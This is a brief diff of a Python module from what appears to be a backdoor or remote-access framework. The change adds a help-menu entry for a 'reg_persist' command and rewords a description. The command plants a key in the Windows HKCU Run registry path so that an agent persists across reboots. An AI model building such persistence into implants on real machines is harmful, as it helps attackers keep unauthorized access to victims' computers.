@@ -30,9 +30,11 @@ def registry_persist(path):
         config.logics.append('''
             elif command == "reg_persist":
                 registry_persist(path.join(getcwd(),argv[0]))''')
+        config.help_menu[
+            'reg_persist'] = 'This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
     elif option == 'info':
         print '\nName             : Registry Persistence component' \
               '\nOS               : Windows' \
               '\nRequired Modules : _winreg, sys, os' \
               '\nCommands         : reg_persist' \
-              '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry folder'
+              '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
